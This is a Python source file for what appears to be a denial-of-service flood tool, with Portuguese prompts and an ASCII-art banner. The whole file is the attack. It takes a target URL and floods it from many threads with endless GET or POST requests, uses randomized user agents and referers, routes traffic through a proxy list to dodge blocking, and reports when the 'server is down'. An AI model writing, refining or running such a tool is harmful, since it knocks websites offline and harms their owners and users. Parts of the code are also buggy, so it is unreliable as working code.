import requests
import random
import threading
import time
from colorama import Fore





def image_ascii():
  imagem = """(                                                                                         
(()/( (          (      )                )\ )  )\ )                      
/(_)))\   (    ))\  ( /(               (()/( (()/(  (   (               
(_)) ((_)  )\  /((_) )\()) __ __         ((_)) ((_)) )\  )\        __ __ 
/ __| (_) ((_)(_))( ((_)\  \ \\ \    )   _| |  _| | ((_)((_)  )   / // / 
\__ \ | |/ _ \| || |\ \ /   > >> >  /( / _` |/ _` |/ _ \(_-< /(  < << <        
|___/ |_|\___/ \_,_|/_\_\  /_//_/  (_))\__,_|\__,_|\___//__/(_))  \_\\_\       ➳ {Github: Mizugue}                                                    
                           .   ./ &                                            ➳ {𝙒𝙧𝙞𝙩𝙚 𝙗𝙮 𝙈𝙯𝙜}
                       %@# (& /   *  #/                     
                   .(& &@@. .@@@. /     *#&@@               
                 (@,*@(.*#@@/   ,%@@@   (*                  
               **@@@%%@#   #@@@@#           .(@@&           
               @@(%@& /&@@@@&   ,&,&@@@@#  /                
             @.(%  @@@@( (@@@&* .  ,(#%#(..    .#@%,        
          * (.  %* /&* #@@@@@@@@@@@( .,..    .#%*           
        //@@,,(&((,  *(#%%%&%%##(*,.                        
       @&/#/*&@@.@@% .        ,(&&/&@@@@@@@@@%,    (&,      
       &@@@@@@@&#@*(/@.@@( .#@@@@@@@/%%#,        ,#@@&#*    
      @@%%@@@@@@@@&*/    /@, @@@@#  /%% (@@@@@@. *,         
      @@@@.@@@@@@,&,,  %(   %@    ,@@/##@%           .@/    
     @@@@@@@@@@@@(& ,*& @*&@,** /@@(     &@(@@@*        .,  
    &@@@@@@@@@@@@/ #.%@, @& @@@( &@#@@&*       ,&@@( (,     
      @@@%@@@@@@@@ @ &@@  &@/ @.@@#   @@@@@/      *#*   @/  
      @@@@%@@@@@& .% #,@.  *@@   /@@#     ,@@@@, /.         
      @@@@@%. &@@,@   &@,    @@ /   ,@@. /          &       
              %@@ ,    @#,     % &     ,@  &       .%@@(    
               &*      %@#     @ ./      /   @              
                      , (&       &@         /@@*            
                       % @                                  
                       .@@                                  
                        .                                    """
  return imagem









def menu():
  try:
    target = (input('Alvo➳ '))
    threads = (int(input("Número de Threads➳ ")))
    delay = (int(input("Delay(intervalo entre requisicoes)➳ ")))
    metodo = (input("Qual método do ataque(POST/GET)➳ "))
    opprox = (input("Deseja utilizar proxies➳ "))
  except:
    print('Voce digitou algo errado.....\n')
    menu()

  if opprox != 'sim' and opprox != 'SIM' and opprox != 'nao' and opprox != "NAO" and opprox != "Sim" and opprox != 'Nao':
    print('Opcoes --> sim ou nao!\n')
    menu()
  elif opprox == 'Sim' or opprox == 'sim' or opprox == 'SIM':
    opprox = True
  else:
    opprox = None

  if metodo != 'post' and metodo != 'POST' and metodo != 'get' and metodo != 'GET':
    print('Opcoes --> POST ou GET!\n')
    menu()

  elif metodo == 'post' or metodo == 'POST':
    try:
      payload = input("Payload➳ ")
      return target, threads, delay, metodo, payload, opprox
    except EOFError:
      payload = ''
      return target, threads, delay, metodo, payload, opprox
    except:
      print('Voce digitou algo errado....\n')
      menu()

  else:
    return target, threads, delay, metodo, opprox




def useragent_list():

  with open('user-agents', 'r') as arquivo:
    for linha in arquivo:
        headers_useragents.append(linha.strip())

  return headers_useragents


def randomString(size):
  out_str = ''

  for i in range(0, size):
    a = random.randint(65, 90)
    out_str += chr(a)

  return out_str

def initHeaders():

  useragent_list()


  headers = {
      'User-Agent': random.choice(headers_useragents),
      'Cache-Control': 'no-cache',
      'Accept-Charset':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', #'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Referer': f'http://www.google.com/?q={randomString(random.randint(5, 10))}',
      'Keep-Alive': str(random.randint(110, 120)),
      'Connection': 'keep-alive'
  }
  return headers

def proxies():
  with open('proxiesvalidos.txt', "r") as f:

    proxy = f.read().split("\n")

  proxy = random.choice(proxy)

  return proxy

def sendGET():

  headers = initHeaders()
  try:
    if opcao:
      proxy = proxies()
      resposta = requests.get(target, proxies={"http": proxy, "https": proxy}, headers=headers)
      return resposta.status_code
    else:
      resposta = requests.get(target, headers=headers)
      return resposta.status_code

  except:
    print(Fore.YELLOW + f'--> Pacote foi barrado pelo firewall ou não obteve exito em sua entrega <--\n')
    pass

def sendPOST():
  global payload
  payload = puxada[4]
  headers = initHeaders()

  try:
    if opcao:
      proxy = proxies()
      resposta = requests.get(target, proxies={"http": proxy, "https": proxy}, headers=headers, data=payload)
      return resposta.status_code
    else:
      resposta = requests.get(target, headers=headers, data=payload)
      return resposta.status_code

  except:
    print(Fore.YELLOW + f'--> Pacote foi barrado pelo firewall ou não obteve exito em sua entrega <--\n')
    pass

def attack():

  while True:

    if delay > 0:
      time.sleep(delay)

    if metodo == 'post' or metodo == 'POST':
      resposta = sendPOST()
      if resposta == '500':
        print(Fore.LIGHTRED_EX + f'☢ Server derrubado ☢ / (Resposta {resposta})\n')
      elif resposta == None:
        print(Fore.LIGHTGREEN_EX + f'!  Falha na requisição ao servidor (erro cliente).... (Method: POST) / (Resposta: {resposta}) ! \n')
      elif resposta == '429':
        print(Fore.MAGENTA + f'( º﹃º ) Voce excedeu o limite de solicitaçoes, logo sendo bloqueado pelo Servidor ( º﹃º ) \n')
      else:
        print(Fore.LIGHTGREEN_EX + f'☠ Enviando pacotes.... (Method: POST) / (Resposta: {resposta}) ☠\n')



    else:
      resposta = sendGET()
      if resposta == '500':
        print(Fore.LIGHTRED_EX + f'☢ Server derrubado ☢ / (Resposta {resposta})\n')
      elif resposta == None:
        print(Fore.LIGHTGREEN_EX + f'! Falha na requisição ao servidor (erro cliente).... (Method: GET) / (Resposta: {resposta}) ! \n')
      elif resposta == '429':
        print(Fore.MAGENTA + f'( º﹃º ) Voce excedeu o limite de solicitaçoes, logo sendo bloqueado pelo Servidor ( º﹃º ) \n')
      else:
        print(Fore.LIGHTGREEN_EX + f'☠ Enviando pacotes.... (Method: GET) / (Resposta: {resposta}) ☠\n')



if __name__ == "__main__":

  print(image_ascii())

  headers_useragents = []
  puxada = list(menu())
  target = puxada[0]
  threads = puxada[1]
  delay = puxada[2]
  metodo = puxada[3]
  opcao = puxada[4]

  if delay == 0:
    pps = threads
  else:
    pps = threads /delay


  for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()




  print(f"""          4$$-.               
           4   ".             
           4    ^.            
           4     $            
           4     'b           
           4      "b.                / Ataque se Iniciando.... /
           4        $         
           4        $r             / {threads} threads / 
           4        $F              
-$b========4========$b====*P=-   / {delay}s delay /
           4       *$$F       
           4        $$"        / {pps} pps /
           4       .$F        
           4       dP        / {opcao} proxy /
           4      F           
           4     @            
           4    .             
           J.                 
          '$$                  \n""")



